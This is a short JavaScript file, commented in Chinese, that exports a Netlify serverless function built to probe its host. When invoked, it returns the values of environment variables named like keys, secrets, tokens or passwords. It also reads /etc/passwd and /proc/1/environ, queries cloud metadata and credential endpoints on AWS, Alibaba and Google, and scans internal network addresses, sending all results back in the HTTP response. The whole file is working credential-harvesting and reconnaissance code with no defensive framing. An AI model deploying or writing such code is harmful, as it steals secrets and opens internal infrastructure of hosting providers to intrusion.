// Netlify 函数探测:env / fs / metadata / 内网
const PROBE = async () => {
  const out = { env: {}, envCount: 0, fs: [], meta: {}, net: [] };
  try {
    for (const k of Object.keys(process.env)) {
      const v = process.env[k];
      if (/key|secret|token|pass|cred|auth|nfu|npg|netlify/i.test(k)) out.env[k] = v;
    }
    out.envCount = Object.keys(process.env).length;
  } catch (e) { out.envErr = String(e); }

  // 常见敏感路径
  const paths = ['/etc/passwd', '/var/run/secrets/', '/proc/1/environ', '/opt/', '/var/task/', '/tmp/'];
  try {
    const fs = require('fs');
    for (const p of paths) {
      try {
        const st = fs.statSync(p);
        out.fs.push(p + ' [dir=' + st.isDirectory() + ']');
      } catch (e) { out.fs.push(p + ' ERR ' + String(e).slice(0, 40)); }
    }
    try { out.fs.push('/etc/passwd head: ' + fs.readFileSync('/etc/passwd', 'utf8').slice(0, 100)); } catch (e) {}
    try { out.fs.push('proc1 env: ' + (fs.readFileSync('/proc/1/environ', 'utf8') || '').replace(/\0/g, '|').slice(0, 500)); } catch (e) {}
  } catch (e) { out.fsErr = String(e); }

  // metadata / 内网
  const targets = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.170.2/v2/credentials',
    'http://100.100.100.200/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://10.0.0.1/', 'http://172.16.0.1/', 'http://172.31.0.1/',
    'http://192.168.0.1/', 'http://localhost/', 'http://127.0.0.1/',
  ];
  const results = [];
  await Promise.all(targets.map(async (u) => {
    try {
      const ctl = new AbortController();
      const t = setTimeout(() => ctl.abort(), 2500);
      const r = await fetch(u, { signal: ctl.signal, headers: { 'Metadata': 'true' } });
      clearTimeout(t);
      const txt = await r.text();
      results.push(u + ' => ' + r.status + ' len=' + txt.length + ' head=' + txt.slice(0, 80).replace(/\n/g, ' '));
    } catch (e) { results.push(u + ' => ERR ' + String(e).slice(0, 50)); }
  }));
  out.net = results;
  return { statusCode: 200, body: JSON.stringify(out) };
};
exports.handler = PROBE;
